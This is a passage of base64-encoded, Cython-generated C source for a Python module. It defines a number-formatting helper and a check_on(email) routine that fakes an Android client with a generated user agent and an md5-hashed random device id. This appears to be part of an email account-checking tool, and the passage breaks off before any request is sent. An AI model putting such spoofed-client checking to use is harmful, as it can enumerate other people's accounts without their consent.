HZhbHVlc1swXTtcbiAgfVxuICBnb3RvIF9fcHl4X0w2X3NraXA7XG4gIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yOjtcbiAgX19QeXhfUmFpc2VBcmd0dXBsZUludmFsaWQoImZvcm1hdF9udW1iZXIiLCAxLCAxLCAxLCBfX3B5eF9uYXJncyk7IF9fUFlYX0VSUigwLCAzMzgsIF9fcHl4X0wzX2Vycm9yKVxuICBfX3B5eF9MNl9za2lwOjtcbiAgZ290byBfX3B5eF9MNF9hcmd1bWVudF91bnBhY2tpbmdfZG9uZTtcbiAgX19weXhfTDNfZXJyb3I6O1xuICBmb3IgKFB5X3NzaXplX3QgX19weXhfdGVtcD0wOyBfX3B5eF90ZW1wIDwgKFB5X3NzaXplX3QpKHNpemVvZih2YWx1ZXMpL3NpemVvZih2YWx1ZXNbMF0pKTsgKytfX3B5eF90ZW1wKSB7XG4gICAgUHlfWERFQ1JFRih2YWx1ZXNbX19weXhfdGVtcF0pO1xuICB9XG4gIF9fUHl4X0FkZFRyYWNlYmFjaygib3AuZm9ybWF0X251bWJlciIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpO1xuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIE5VTEw7XG4gIF9fcHl4X0w0X2FyZ3VtZW50X3VucGFja2luZ19kb25lOjtcbiAgX19weXhfciA9IF9fcHl4X3BmXzJvcF8xMmZvcm1hdF9udW1iZXIoX19weXhfc2VsZiwgX19weXhfdl92YWx1ZSk7XG5cbiAgXG4gIGZvciAoUHlfc3NpemVfdCBfX3B5eF90ZW1wPTA7IF9fcHl4X3RlbXAgPCAoUHlfc3NpemVfdCkoc2l6ZW9mKHZhbHVlcykvc2l6ZW9mKHZhbHVlc1swXSkpOyArK19fcHl4X3RlbXApIHtcbiAgICBQeV9YREVDUkVGKHZhbHVlc1tfX3B5eF90ZW1wXSk7XG4gIH1cbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiBfX3B5eF9yO1xufVxuXG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X3BmXzJvcF8xMmZvcm1hdF9udW1iZXIoQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfc2VsZiwgUHlPYmplY3QgKl9fcHl4X3ZfdmFsdWUpIHtcbiAgUHlPYmplY3QgKl9fcHl4X3IgPSBOVUxMO1xuICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9uc1xuICBQeU9iamVjdCAqX19weXhfdF8xID0gTlVMTDtcbiAgaW50IF9fcHl4X3RfMjtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMyA9IE5VTEw7XG4gIGludCBfX3B5eF9saW5lbm8gPSAwO1xuICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7XG4gIGludCBfX3B5eF9jbGluZW5vID0gMDtcbiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoImZvcm1hdF9udW1iZXIiLCAwKTtcbiAgX19QeXhfSU5DUkVGKF9fcHl4X3ZfdmFsdWUpO1xuXG4gIFxuICBfX3B5eF90XzEgPSBfX1B5eF9QeU51bWJlcl9GbG9hdChfX3B5eF92X3ZhbHVlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgMzM5LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7XG4gIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdl92YWx1ZSwgX19weXhfdF8xKTtcbiAgX19weXhfdF8xID0gMDtcblxuICBcbiAgX19weXhfdF8xID0gUHlPYmplY3RfUmljaENvbXBhcmUoX19weXhfdl92YWx1ZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzEwMDAwMDAsIFB5X0dFKTsgX19QeXhfWEdPVFJFRihfX3B5eF90XzEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAzNDAsIF9fcHl4X0wxX2Vycm9yKVxuICBfX3B5eF90XzIgPSBfX1B5eF9QeU9iamVjdF9Jc1RydWUoX19weXhfdF8xKTsgaWYgKHVubGlrZWx5KChfX3B5eF90XzIgPCAwKSkpIF9fUFlYX0VSUigwLCAzNDAsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcbiAgaWYgKF9fcHl4X3RfMikge1xuXG4gICAgXG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF9yKTtcbiAgICBfX3B5eF90XzEgPSBfX1B5eF9QeUxvbmdfVHJ1ZURpdmlkZU9iakMoX19weXhfdl92YWx1ZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzEwMDAwMDAsIDB4RjQyNDAsIDAsIDApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAzNDEsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpO1xuICAgIF9fcHl4X3RfMyA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdChfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMWYpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAzNDEsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpO1xuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICAgIF9fcHl4X3RfMSA9IF9fUHl4X1B5VW5pY29kZV9Db25jYXRJblBsYWNlKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X20pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAzNDEsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpO1xuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuICAgIF9fcHl4X3IgPSBfX3B5eF90XzE7XG4gICAgX19weXhfdF8xID0gMDtcbiAgICBnb3RvIF9fcHl4X0wwO1xuXG4gICAgXG4gIH1cblxuICBcbiAgX19weXhfdF8xID0gUHlPYmplY3RfUmljaENvbXBhcmUoX19weXhfdl92YWx1ZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzEwMDAsIFB5X0dFKTsgX19QeXhfWEdPVFJFRihfX3B5eF90XzEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAzNDIsIF9fcHl4X0wxX2Vycm9yKVxuICBfX3B5eF90XzIgPSBfX1B5eF9QeU9iamVjdF9Jc1RydWUoX19weXhfdF8xKTsgaWYgKHVubGlrZWx5KChfX3B5eF90XzIgPCAwKSkpIF9fUFlYX0VSUigwLCAzNDIsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcbiAgaWYgKF9fcHl4X3RfMikge1xuXG4gICAgXG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF9yKTtcbiAgICBfX3B5eF90XzEgPSBfX1B5eF9QeUxvbmdfVHJ1ZURpdmlkZU9iakMoX19weXhfdl92YWx1ZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzEwMDAsIDB4M0U4LCAwLCAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgMzQzLCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTtcbiAgICBfX3B5eF90XzMgPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXQoX19weXhfdF8xLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzFmKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMzQzLCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTtcbiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcbiAgICBfX3B5eF90XzEgPSBfX1B5eF9QeVVuaWNvZGVfQ29uY2F0SW5QbGFjZShfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9rKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgMzQzLCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTtcbiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcbiAgICBfX3B5eF9yID0gX19weXhfdF8xO1xuICAgIF9fcHl4X3RfMSA9IDA7XG4gICAgZ290byBfX3B5eF9MMDtcblxuICAgIFxuICB9XG5cbiAgXG4gIF9fUHl4X1hERUNSRUYoX19weXhfcik7XG4gIF9fcHl4X3RfMSA9IF9fUHl4X1B5TnVtYmVyX0ludChfX3B5eF92X3ZhbHVlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgMzQ0LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7XG4gIF9fcHl4X3RfMyA9IF9fUHl4X1B5T2JqZWN0X1VuaWNvZGUoX19weXhfdF8xKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMzQ0LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICBfX3B5eF9yID0gX19weXhfdF8zO1xuICBfX3B5eF90XzMgPSAwO1xuICBnb3RvIF9fcHl4X0wwO1xuXG4gIFxuXG4gIFxuICBfX3B5eF9MMV9lcnJvcjo7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpO1xuICBfX1B5eF9BZGRUcmFjZWJhY2soIm9wLmZvcm1hdF9udW1iZXIiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTtcbiAgX19weXhfciA9IE5VTEw7XG4gIF9fcHl4X0wwOjtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X3ZhbHVlKTtcbiAgX19QeXhfWEdJVkVSRUYoX19weXhfcik7XG4gIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpO1xuICByZXR1cm4gX19weXhfcjtcbn1cblxuXG5cblxuc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wd18yb3BfMTVjaGVja19vbihQeU9iamVjdCAqX19weXhfc2VsZiwgXG4jaWYgQ1lUSE9OX01FVEhfRkFTVENBTExcblB5T2JqZWN0ICpjb25zdCAqX19weXhfYXJncywgUHlfc3NpemVfdCBfX3B5eF9uYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHNcbiNlbHNlXG5QeU9iamVjdCAqX19weXhfYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHNcbiNlbmRpZlxuKTsgXG5zdGF0aWMgUHlNZXRob2REZWYgX19weXhfbWRlZl8yb3BfMTVjaGVja19vbiA9IHsiY2hlY2tfb24iLCAoUHlDRnVuY3Rpb24pKHZvaWQoKikodm9pZCkpKF9fUHl4X1B5Q0Z1bmN0aW9uX0Zhc3RDYWxsV2l0aEtleXdvcmRzKV9fcHl4X3B3XzJvcF8xNWNoZWNrX29uLCBfX1B5eF9NRVRIX0ZBU1RDQUxMfE1FVEhfS0VZV09SRFMsIDB9O1xuc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wd18yb3BfMTVjaGVja19vbihQeU9iamVjdCAqX19weXhfc2VsZiwgXG4jaWYgQ1lUSE9OX01FVEhfRkFTVENBTExcblB5T2JqZWN0ICpjb25zdCAqX19weXhfYXJncywgUHlfc3NpemVfdCBfX3B5eF9uYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHNcbiNlbHNlXG5QeU9iamVjdCAqX19weXhfYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHNcbiNlbmRpZlxuKSB7XG4gIFB5T2JqZWN0ICpfX3B5eF92X2VtYWlsID0gMDtcbiAgI2lmICFDWVRIT05fTUVUSF9GQVNUQ0FMTFxuICBDWVRIT05fVU5VU0VEIFB5X3NzaXplX3QgX19weXhfbmFyZ3M7XG4gICNlbmRpZlxuICBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpjb25zdCAqX19weXhfa3d2YWx1ZXM7XG4gIFB5T2JqZWN0KiB2YWx1ZXNbMV0gPSB7MH07XG4gIGludCBfX3B5eF9saW5lbm8gPSAwO1xuICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7XG4gIGludCBfX3B5eF9jbGluZW5vID0gMDtcbiAgUHlPYmplY3QgKl9fcHl4X3IgPSAwO1xuICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9uc1xuICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgiY2hlY2tfb24gKHdyYXBwZXIpIiwgMCk7XG4gICNpZiAhQ1lUSE9OX01FVEhfRkFTVENBTExcbiAgI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFXG4gIF9fcHl4X25hcmdzID0gUHlUdXBsZV9HRVRfU0laRShfX3B5eF9hcmdzKTtcbiAgI2Vsc2VcbiAgX19weXhfbmFyZ3MgPSBQeVR1cGxlX1NpemUoX19weXhfYXJncyk7IGlmICh1bmxpa2VseShfX3B5eF9uYXJncyA8IDApKSByZXR1cm4gTlVMTDtcbiAgI2VuZGlmXG4gICNlbmRpZlxuICBfX3B5eF9rd3ZhbHVlcyA9IF9fUHl4X0t3VmFsdWVzX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIF9fcHl4X25hcmdzKTtcbiAge1xuICAgIFB5T2JqZWN0ICoqIGNvbnN0IF9fcHl4X3B5YXJnbmFtZXNbXSA9IHsmX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2VtYWlsLDB9O1xuICAgIGNvbnN0IFB5X3NzaXplX3QgX19weXhfa3dkc19sZW4gPSAoX19weXhfa3dkcykgPyBfX1B5eF9OdW1Ld2FyZ3NfRkFTVENBTEwoX19weXhfa3dkcykgOiAwO1xuICAgIGlmICh1bmxpa2VseShfX3B5eF9rd2RzX2xlbikgPCAwKSBfX1BZWF9FUlIoMCwgMzQ3LCBfX3B5eF9MM19lcnJvcilcbiAgICBpZiAoX19weXhfa3dkc19sZW4gPiAwKSB7XG4gICAgICBzd2l0Y2ggKF9fcHl4X25hcmdzKSB7XG4gICAgICAgIGNhc2UgIDE6XG4gICAgICAgIHZhbHVlc1swXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAwKTtcbiAgICAgICAgaWYgKCFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmIHVubGlrZWx5KCF2YWx1ZXNbMF0pKSBfX1BZWF9FUlIoMCwgMzQ3LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgQ1lUSE9OX0ZBTExUSFJPVUdIO1xuICAgICAgICBjYXNlICAwOiBicmVhaztcbiAgICAgICAgZGVmYXVsdDogZ290byBfX3B5eF9MNV9hcmd0dXBsZV9lcnJvcjtcbiAgICAgIH1cbiAgICAgIGNvbnN0IFB5X3NzaXplX3Qga3dkX3Bvc19hcmdzID0gX19weXhfbmFyZ3M7XG4gICAgICBpZiAoX19QeXhfUGFyc2VLZXl3b3JkcyhfX3B5eF9rd2RzLCBfX3B5eF9rd3ZhbHVlcywgX19weXhfcHlhcmduYW1lcywgMCwgdmFsdWVzLCBrd2RfcG9zX2FyZ3MsIF9fcHl4X2t3ZHNfbGVuLCAiY2hlY2tfb24iLCAwKSA8ICgwKSkgX19QWVhfRVJSKDAsIDM0NywgX19weXhfTDNfZXJyb3IpXG4gICAgICBmb3IgKFB5X3NzaXplX3QgaSA9IF9fcHl4X25hcmdzOyBpIDwgMTsgaSsrKSB7XG4gICAgICAgIGlmICh1bmxpa2VseSghdmFsdWVzW2ldKSkgeyBfX1B5eF9SYWlzZUFyZ3R1cGxlSW52YWxpZCgiY2hlY2tfb24iLCAxLCAxLCAxLCBpKTsgX19QWVhfRVJSKDAsIDM0NywgX19weXhfTDNfZXJyb3IpIH1cbiAgICAgIH1cbiAgICB9IGVsc2UgaWYgKHVubGlrZWx5KF9fcHl4X25hcmdzICE9IDEpKSB7XG4gICAgICBnb3RvIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yO1xuICAgIH0gZWxzZSB7XG4gICAgICB2YWx1ZXNbMF0gPSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoX19weXhfYXJncywgMCk7XG4gICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1swXSkpIF9fUFlYX0VSUigwLCAzNDcsIF9fcHl4X0wzX2Vycm9yKVxuICAgIH1cbiAgICBfX3B5eF92X2VtYWlsID0gdmFsdWVzWzBdO1xuICB9XG4gIGdvdG8gX19weXhfTDZfc2tpcDtcbiAgX19weXhfTDVfYXJndHVwbGVfZXJyb3I6O1xuICBfX1B5eF9SYWlzZUFyZ3R1cGxlSW52YWxpZCgiY2hlY2tfb24iLCAxLCAxLCAxLCBfX3B5eF9uYXJncyk7IF9fUFlYX0VSUigwLCAzNDcsIF9fcHl4X0wzX2Vycm9yKVxuICBfX3B5eF9MNl9za2lwOjtcbiAgZ290byBfX3B5eF9MNF9hcmd1bWVudF91bnBhY2tpbmdfZG9uZTtcbiAgX19weXhfTDNfZXJyb3I6O1xuICBmb3IgKFB5X3NzaXplX3QgX19weXhfdGVtcD0wOyBfX3B5eF90ZW1wIDwgKFB5X3NzaXplX3QpKHNpemVvZih2YWx1ZXMpL3NpemVvZih2YWx1ZXNbMF0pKTsgKytfX3B5eF90ZW1wKSB7XG4gICAgUHlfWERFQ1JFRih2YWx1ZXNbX19weXhfdGVtcF0pO1xuICB9XG4gIF9fUHl4X0FkZFRyYWNlYmFjaygib3AuY2hlY2tfb24iLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTtcbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiBOVUxMO1xuICBfX3B5eF9MNF9hcmd1bWVudF91bnBhY2tpbmdfZG9uZTo7XG4gIF9fcHl4X3IgPSBfX3B5eF9wZl8yb3BfMTRjaGVja19vbihfX3B5eF9zZWxmLCBfX3B5eF92X2VtYWlsKTtcblxuICBcbiAgZm9yIChQeV9zc2l6ZV90IF9fcHl4X3RlbXA9MDsgX19weXhfdGVtcCA8IChQeV9zc2l6ZV90KShzaXplb2YodmFsdWVzKS9zaXplb2YodmFsdWVzWzBdKSk7ICsrX19weXhfdGVtcCkge1xuICAgIFB5X1hERUNSRUYodmFsdWVzW19fcHl4X3RlbXBdKTtcbiAgfVxuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIF9fcHl4X3I7XG59XG5cbnN0YXRpYyBQeU9iamVjdCAqX19weXhfcGZfMm9wXzE0Y2hlY2tfb24oQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfc2VsZiwgUHlPYmplY3QgKl9fcHl4X3ZfZW1haWwpIHtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfdWEgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdl9kZXYgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdl9kZXZpY2VfaWQgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdl91dWkgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdl9oZWFkZXJzID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfZGF0YSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF92X3Jlc3BvbnNlID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3IgPSBOVUxMO1xuICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9uc1xuICBQeU9iamVjdCAqX19weXhfdF8xID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMiA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzMgPSBOVUxMO1xuICBzaXplX3QgX19weXhfdF80O1xuICBQeU9iamVjdCAqX19weXhfdF81ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfNiA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzcgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF84ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfOSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzEwID0gTlVMTDtcbiAgaW50IF9fcHl4X3RfMTE7XG4gIGludCBfX3B5eF9saW5lbm8gPSAwO1xuICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7XG4gIGludCBfX3B5eF9jbGluZW5vID0gMDtcbiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoImNoZWNrX29uIiwgMCk7XG5cbiAgXG4gIF9fcHl4X3RfMiA9IE5VTEw7XG4gIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2VuZXJhdGVfdXNlcl9hZ2VudCk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDM0OSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpO1xuICBfX3B5eF90XzQgPSAxO1xuICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTXG4gIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzMpKSkge1xuICAgIF9fcHl4X3RfMiA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfMyk7XG4gICAgYXNzZXJ0KF9fcHl4X3RfMik7XG4gICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzMpO1xuICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzIpO1xuICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pO1xuICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF8zLCBfX3B5eF9fZnVuY3Rpb24pO1xuICAgIF9fcHl4X3RfNCA9IDA7XG4gIH1cbiAgI2VuZGlmXG4gIHtcbiAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8yLCBOVUxMfTtcbiAgICBfX3B5eF90XzEgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzMsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNCwgKDEtX19weXhfdF80KSB8IChfX3B5eF90XzQqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDM0OSwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7XG4gIH1cbiAgX19weXhfdl91YSA9IF9fcHl4X3RfMTtcbiAgX19weXhfdF8xID0gMDtcblxuICBcbiAgX19QeXhfSU5DUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfYW5kcm9pZCk7XG4gIF9fcHl4X3ZfZGV2ID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9hbmRyb2lkO1xuXG4gIFxuICBfX3B5eF90XzUgPSBOVUxMO1xuICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2hhc2hsaWIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAzNTEsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTtcbiAgX19weXhfdF83ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9tZDUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCAzNTEsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gIF9fcHl4X3RfOCA9IE5VTEw7XG4gIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF85LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdXVpZCk7IGlmICh1bmxpa2VseSghX19weXhfdF85KSkgX19QWVhfRVJSKDAsIDM1MSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzkpO1xuICBfX3B5eF90XzEwID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzksIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV91dWlkNCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIF9fUFlYX0VSUigwLCAzNTEsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMCk7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzkpOyBfX3B5eF90XzkgPSAwO1xuICBfX3B5eF90XzQgPSAxO1xuICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTXG4gIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzEwKSkpIHtcbiAgICBfX3B5eF90XzggPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzEwKTtcbiAgICBhc3NlcnQoX19weXhfdF84KTtcbiAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfMTApO1xuICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzgpO1xuICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pO1xuICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF8xMCwgX19weXhfX2Z1bmN0aW9uKTtcbiAgICBfX3B5eF90XzQgPSAwO1xuICB9XG4gICNlbmRpZlxuICB7XG4gICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfOCwgTlVMTH07XG4gICAgX19weXhfdF82ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF8xMCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF80LCAoMS1fX3B5eF90XzQpIHwgKF9fcHl4X3RfNCpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7XG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDtcbiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAzNTEsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpO1xuICB9XG4gIF9fcHl4X3RfMTAgPSBfX1B5eF9QeU9iamVjdF9Vbmljb2RlKF9fcHl4X3RfNik7IGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIF9fUFlYX0VSUigwLCAzNTEsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMCk7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICBfX3B5eF90XzYgPSBQeVVuaWNvZGVfQXNFbmNvZGVkU3RyaW5nKCgoUHlPYmplY3QqKV9fcHl4X3RfMTApLCBOVUxMLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMzUxLCBfX3B5eF9MMV9lcnJvcilcbiA